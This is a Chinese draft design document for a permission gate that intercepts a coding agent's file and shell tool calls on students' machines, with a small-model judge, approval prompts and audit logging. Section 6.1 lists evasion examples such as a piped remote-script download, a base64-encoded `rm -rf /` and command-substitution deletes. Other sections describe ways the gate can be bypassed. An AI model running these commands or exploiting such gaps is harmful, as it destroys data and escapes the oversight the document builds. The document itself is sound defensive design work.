# 权限闸 · 详细设计

> 版本：v0.1（骨架 + 已确认结论）｜ 状态：草稿 ｜ 日期：2026-09-14
> 上游：[../01-requirements.md](../01-requirements.md) 第 2 节、[adr/0006](./adr/0006-subagent-process-model.md)、[adr/0007](./adr/0007-permission-gate-hook-point.md)
> 下游：[gui.md](./gui.md)、[ipc-contract.md](./ipc-contract.md)、[../test/permission-cases.md](../test/permission-cases.md)

> **说明**：本文件里 `【已定】` 的条目有 pi 源码级证据（文件:行号）；`【待决】` 的条目还没拍板，**不要据此开工**。

## 1. 这个模块要解决什么

学生的电脑上跑着一个能读写文件、执行任意命令的 agent。需求要求：

1. 每次工具调用执行前拦截（尤其 `bash` / `write` / `edit`）
2. 三态判定：放行 / 拒绝 / 询问
3. 分级：白名单直放、黑名单必问、灰区交小模型判危险（拿不准 = 危险）
4. 三档设置：变更前确认（默认）/ 自动审批 / 完全访问
5. 主 agent 与子代理**共用同一道闸**
6. 审计日志 + 界面可见可中止

**为什么这个模块最要紧**：pi 的内置工具**没有任何路径约束**【已定】——`write` 直接 `resolveToCwd(path, cwd)` 落盘，没有 cwd 包含性校验，还支持绝对路径和 `~`（`src/core/tools/write.ts:206`、`src/core/tools/path-utils.ts:48-50`）。也就是说：**闸是唯一防线，闸漏了就没有第二层。**

## 2. 挂点【已定】

**两层串联**（详见 [adr/0007](./adr/0007-permission-gate-hook-point.md)）：

```
模型产出 toolCall
      │
      ▼
┌─────────────────────────────────────────┐
│ 我们的闸：Agent.beforeToolCall（最外层） │  ← 看原始参数，做硬判定
│   入参 { assistantMessage, toolCall, args, context }
│   出参 { block?, reason?, terminate? }
└─────────────────────────────────────────┘
      │ 放行
      ▼
  AgentSession 已装的钩子 → runner.emitToolCall() → 扩展的 tool_call 事件
      │
      ▼
   工具真正执行
```

**为什么不只用扩展的 `tool_call` 事件**【已定】：扩展链上 `event.input` 可以被 handler 原地修改且**改完不再重新校验**（`packages/agent/src/types.ts:898-903`、`docs/extensions.md:759-766`），后面的 handler 还能看到前面的改动。官方有两张 open issue 在要求"最终不可变的准入钩子"，说明维护者也知道这个不够，但**该钩子尚不存在**。

**实现注意**【已定】：

- `session.agent` 是 `readonly`，但只锁字段本身；`Agent.beforeToolCall` 是 **public 可赋值字段**（`packages/agent/src/agent.ts:193`），所以可以包装
- `AgentSession` 在构造函数里调 `_installAgentToolHooks()` 装钩子（`agent-session.ts:396`），且代码注释明确**只装一次、扩展重载时不重装**（`:471-478`）→ 我们的包装不会被冲掉
- **包装时必须接住原有的钩子并继续调用**，否则会悄悄废掉整个扩展系统

## 3. 判定流水线

```
拦截点
  → ① 白名单：项目目录内常规读写、常见安全命令 → 放行
  → ② 黑名单：大面积删除、出项目目录、联网、装全局包 → 询问
  → ③ 灰区：小模型判危险系数（拿不准 = 危险）→ 放行 / 询问
  → ④ 三档执行：变更前确认 / 自动审批 / 完全访问
  → ⑤ 审计日志：全部动作落盘可查
```

**贯穿全流程的原则**：档位决定"要不要先问"，**不决定"要不要告诉你"**。

## 4. 三态与数据契约

pi 原生只有"过 / 拦"二态【已定】——`BeforeToolCallResult` 只有 `{ block?, reason?, terminate? }`（`packages/agent/src/types.ts:60-68`）。"询问"是在钩子里 `await` 一次人类决策，钩子本身是 `async` 且带 `AbortSignal` 参数，所以天然支持。

| 态 | 实现 | 说明 |
|---|---|---|
| 放行 | 返回 `undefined` | |
| 拒绝 | 返回 `{ block: true, reason }` | |
| 询问 | `await approvals.request(...)` 后转成上面两种 | |

**`reason` 的妙用**【已定】：它会成为**模型看到的错误结果文本**（`types.ts:57-58`）。所以拒绝时可以写一段人话解释——模型下一轮就知道"这个动作被拒了，因为 X"，不会傻乎乎重试同一个命令。这在教学场景里价值不小。

**`terminate` 语义很弱**【已定】：只有**整批** finalized 结果都设了 `terminate` 才会提前终止（`types.ts:63-67`）。并行模式下不能指望"拒绝一次就停下"。

## 5. 规则格式【待决】

候选：

| 方案 | 优点 | 缺点 |
|---|---|---|
| 声明式配置文件（类似 Claude Code 的 `permissions.allow/deny/ask`） | 学生可读可改；规则可测；便于做 UI | 需要自己实现匹配引擎 |
| 命令式代码 | 表达力强 | 改规则 = 改代码，学生改不了 |
| 混合：声明式规则 + 代码兜底 | 覆盖常规 + 表达复杂条件 | 两套东西要解释 |

**倾向**：声明式规则 + 代码兜底。等 [research/](../research/README.md) D 渠道（邻近生态）的规则语法调研回来后定。

参考：pi 官方 `plan-mode/utils.ts:7-95` 有现成的 82 条正则（47 条只读白名单 + 35 条破坏性黑名单），可作粗筛，**但正则可被轻易绕过，不能作唯一防线**。

## 6. 判定难点（本模块真正的技术风险）

### 6.1 命令语义解析【待决】

把 `bash` 的 `command` 字符串可靠地判成"大面积删除 / 出目录 / 联网 / 装全局包"，需要**解析 shell 语法**，而不是字符串匹配。绕过字符串匹配的例子：

| 写法 | 绕过了什么 |
|---|---|
| `rm -r -f /path` | 正则 `/rm\s+(-rf?|--recursive)/` 匹配不到 |
| `find . -delete` | 完全不含 `rm` |
| `curl https://x.sh \| sh` | 联网 + 执行远端代码 |
| `echo cm0gLXJmIC8= \| base64 -d \| sh` | 编码绕过 |
| `$(echo rm) -rf /` | 命令替换 |
| `cd / && rm -rf *` | 出目录 + 删除 |

需要处理的结构：管道 `|`、重定向 `>` `>>`、逻辑连接 `;` `&&` `||`、命令替换 `$()` 和反引号、变量展开、`sudo`、`npx`/`pip`/`npm -g`/`winget` 等安装类命令。

**调研结论（E 渠道）**：**有现成的解析库，这块不用自研。**候选如下（均为索引级证据，需在有公网的环境核实后再定）：

| 候选 | 形态 | 优点 | 风险 |
|---|---|---|---|
| **`@aliou/sh`** | 纯 TypeScript 的 shell parser / AST（POSIX / Bash / mksh / zsh） | **无原生依赖，对 Electron 最友好**。作者 aliou 是 pi 的贡献者（可在本地 pi 的 CHANGELOG 里核实） | 需核实维护活跃度与 AST 覆盖面 |
| **`tree-sitter-bash` + wasm 分发** | 编译好的 wasm 语法 | 免编译、生态成熟；有 `tree-sitter-wasms` / `@stephane303/tree-sitter-wasms` / `tree-sitter-wasm-prebuilt` 等分发形式 | **唯一阻塞点：需验证 wasm 包里确实含 bash grammar** |
| `@ericcornelissen/bash-parser` | AST | 原 `bash-parser` 的接管 fork | 原包已停维护，长期风险偏高 |
| `shell-quote` | **仅 tokenizer** | 轻量 | **不是 AST**，单独用会漏 `$(...)`、重定向语义、`curl \| sh` 链路。**不要单独用它做判定** |

**参考实现**：`agent-glovebox/lib-bash-ast.mjs`，它的 PR #3404 标题就是 *"fix(hooks): parse bash in the gates instead of scanning the text"*——**它踩过的坑就是我们的路线图**。

> ⚠️ 注意：树解析只能解决"命令里有什么"，**解决不了"这条命令语义上危不危险"**。AST 之上仍需要我们的分级规则（白/黑名单 + 判官）。

### 6.2 路径边界判定【已定：必须自研】

"出项目目录"必须做**规范化后的真前缀比较**，不能用 `path.includes()`。要处理：`..` 归一化、绝对路径、`~` 展开、Windows 盘符、**符号链接 / junction**（这是最容易漏的）。

官方 `protected-paths.ts` 用 `path.includes(".env")`，`./foo/.env.bak` 就能绕过——**不要照抄这个写法**。

### 6.3 Windows 没有 OS 级兜底【已定：重要约束】

pi 官方的 OS 级沙箱示例依赖 `@anthropic-ai/sandbox-runtime`，底层是 macOS 的 `sandbox-exec` 和 Linux 的 `bubblewrap`，**在 Windows 上直接自我禁用**（`examples/extensions/sandbox/index.ts:251-256`）。`gondolin` 是 Linux micro-VM，同样非 Windows。

⇒ **在 Windows 上，"联网"和"出项目目录"拿不到任何系统级兜底，只能靠闸 + 命令解析。** 这是一条必须写进方案、也必须如实告知用户的约束。

## 7. 灰区判官

**有现成落点**【已定】：扩展内可以直接调模型 —— `ctx.modelRegistry.complete(model, { messages }, { maxTokens, signal })`（`src/core/model-registry.ts:108`），取模型用 `modelRegistry.find(provider, modelId)`（`:56`）。样例见 `examples/extensions/custom-compaction.ts:79-88`、`qna.ts:86`、`summarize.ts:181`。

**设计要点**：

- 拿不准 = 危险（fail-closed）
- **学生的问题、代码输出属不可信内容，不得影响危险判断**（防提示注入）
- 成本可忽略（一次几厘钱），但**延迟要让 GUI 显示"正在评估安全性"**，否则体感像卡死
- 【待决】判官用哪个模型（要便宜且快）；【待决】提示词；【待决】超时阈值与超时后的默认值

## 8. 三档设置

| 档位 | 行为 | 适合场景 |
|---|---|---|
| 变更前确认（默认） | 每个改动动作都弹确认 | 第一次使用、改重要作业 |
| 自动审批 | 低危放行，高危通知确认 | 日常使用 |
| 完全访问（YOLO） | 全部放行；开启时有醒目警告 | 大批量、重复性任务 |

只读动作（读文件、检索资料）**任何档位都不拦**。

**存储位置**【已定的一半】：pi SDK 里**没有 `permissionMode` 这种一等公民设置**，要自己存。扩展的模块级变量**跨会话共享**（各 `AgentSession` 有独立 `ExtensionRunner`，但共享 `resourceLoader` 给的同一个 runtime，`agent-session.ts:2587-2593`），所以档位可以存在共享 runtime 或配置文件里；但 `uiContext` 是 per-session 的。

**现成参考**：`examples/extensions/plan-mode/` 演示了工具集的保存 / 恢复 / 持久化（`:104-114` 保存恢复、`:117-123` `pi.appendEntry` 持久化），`kimi-deferred-tools.ts` 演示了用 `setActiveTools()` 动态开关工具。

## 9. 主 agent 与子代理共用同一道闸

依赖 [adr/0006](./adr/0006-subagent-process-model.md) 的决策（**提议中**）。落地方式：

- **把会话创建收敛成一个工厂函数**，禁止绕过它 new session —— 把"同闸"做成**注册时的不变量**，而不是靠调用方记得传参
- 每个会话都注入**同一个闸实例**、同一个 `ExtensionUIContext`
- 审批请求带 `actor` 字段（`main` / `subagent:<名字>`）
- 子代理的工具集锁在**工具配置层**（`tools: [...]`），不靠提示词

**反面教材**（官方 subagent 示例）：spawn 子进程时父的钩子不继承，且 `--mode json` 下 `hasUI = false` —— 要么子代理全被拒，要么闸被绕过。详见 [adr/0006](./adr/0006-subagent-process-model.md)。

## 10. 审批链路

**核心设计：审批请求是消息，不是函数调用。**

```
闸 --(审批请求 { id, actor, action, risk, options, timeout })--> ApprovalService
                                                                      │
                                                                      ▼
                                                            IPC → GUI 弹窗
                                                                      │
闸 <---------------(回执 { id, decision, remember })------------------┘
```

好处：进程模型可换（将来若改成 RPC 子进程，GUI 侧一行不用改）。

**超时语义**【已定】：RPC 模式的对话框超时后，`select` → `undefined`、`confirm` → `false`、`input` → `undefined`（`docs/rpc.md`）——即**超时 = 拒绝**。这个默认值我们要沿用。

字段定义见 [ipc-contract.md](./ipc-contract.md)。

## 11. 审计日志

**双钩子**【已定】：`tool_call`（拦截时）+ `tool_result`（执行完，`types.ts:1090-1095`）。

**落地参考**：`examples/extensions/tool-override.ts:47-60` 给了 append-file 的审计日志实现，带 `withFileMutationQueue` 串行化，**是最接近我们要的形态的现成件**（144 行）。需要自己决定：格式、轮转、存放位置。

**硬要求**（需求第 4 节硬规矩 5、6）：agent 对学生机器的每个动作在界面上**全部可见、可追溯**，绝不隐瞒执行；服务端收集的记录学生自己能看。

## 12. 失败模式与启动自检

| 失败模式 | 后果 | 对策 |
|---|---|---|
| **闸扩展加载失败** | 【已定】`loader.ts:539-577` 只把错误 push 进 `errors[]` 然后 `continue`，不中断会话。**SDK 内嵌时这就是"无闸静默裸奔"** | **启动自检**：从 `createAgentSession()` 返回的 `extensionsResult.errors` 断言闸已加载，装不上就拒绝启动 |
| **忘记调 `bindExtensions`** | 【已定】`_extensionMode` 默认 `"print"`（`agent-session.ts:357`）→ `noOpUIContext` → `ctx.hasUI === false`。官方 `permission-gate.ts` 会走 block 分支，**表现为"agent 什么都不肯干"且不报错** | 启动时断言 `ctx.hasUI`；写在工厂函数里，不给调用方犯错的机会 |
| **闸自己抛异常** | 【已定】`agent-session.ts:493-498` rethrow → 工具被拒（fail-closed，是好事） | GUI 上要**区分"闸坏了"和"用户拒了"**，否则给学生误导性提示 |
| **第三方扩展绕过闸** | 【已定】扩展与 pi 同进程同权限（`docs/extensions.md:111`、`docs/containerization.md:17`），可以绕过闸直接调 `fs` | 【待决】是否用 `DefaultResourceLoader({ noExtensions: true, extensionFactories: [我们的闸] })` 把扩展面收敛到我们自己的代码 |
| **非交互（`hasUI === false`）** | 弹不出窗 | **定为默认拒绝**（block）——这是唯一能同时防住"子代理绕过"和"忘记 bind"的默认值 |

## 13. 中止

- `ctx.signal`（AbortSignal，`types.ts:334`）—— 关掉对话框、取消嵌套异步工作
- `ctx.abort()`（`:336`）—— 中止整个 agent 操作
- 【待决】子代理卡在同步代码里时怎么办（协作式 abort 杀不掉）

## 14. 待决问题汇总

| # | 问题 | 卡在哪 | 谁来决定 |
|---|---|---|---|
| Q1 | 规则格式：声明式 / 命令式 / 混合 | 等 D 渠道调研 | |
| Q2 | 选哪个 shell 解析库（`@aliou/sh` 纯 TS / `tree-sitter-bash` wasm） | 候选已找到，需在有公网的环境核实后定。见第 6.1 节 | |
| Q3 | 灰区判官用哪个模型、提示词、超时阈值 | | |
| Q4 | 批准记忆的粒度（"本次允许"要不要记住？记多久？） | 官方 issue 提到社区诉求是"更窄、可编辑" | |
| Q5 | 是否收敛扩展面（`noExtensions: true`） | | |
| Q6 | 审计日志的格式、位置、轮转 | | |
| Q7 | 三档的档位名与英文标识 | | |

## 15. 参考（源码级）

| 位置 | 内容 |
|---|---|
| `packages/agent/src/types.ts:60-106` | `BeforeToolCallResult` / `BeforeToolCallContext` 精确契约 |
| `packages/agent/src/types.ts:898-903` | `event.input` 可变且不重校验 |
| `packages/coding-agent/src/core/agent-session.ts:396, 471-499` | 钩子安装点（只装一次） |
| `packages/coding-agent/src/core/agent-session.ts:2237-2260` | `bindExtensions`（会发 `session_start`） |
| `packages/coding-agent/src/core/extensions/types.ts:131-282` | `ExtensionUIContext` 全部 30 个成员（闸只需 5 个） |
| `packages/coding-agent/src/core/model-registry.ts:56, 108` | 判官调模型的落点 |
| `packages/coding-agent/examples/extensions/permission-gate.ts` | 34 行最小三态闸骨架 |
| `packages/coding-agent/examples/extensions/tool-override.ts:47-60` | 审计日志落盘参考 |
| `packages/coding-agent/examples/extensions/timed-confirm.ts` | 对话框超时 / AbortSignal 写法 |
| `packages/coding-agent/examples/extensions/plan-mode/utils.ts:7-95` | 82 条命令分级正则（粗筛用） |
| `packages/coding-agent/src/modes/rpc/rpc-mode.ts:136-208` | **Electron 版 `ExtensionUIContext` 的最佳模板** |

完整盘点见 [../research/README.md](../research/README.md)。
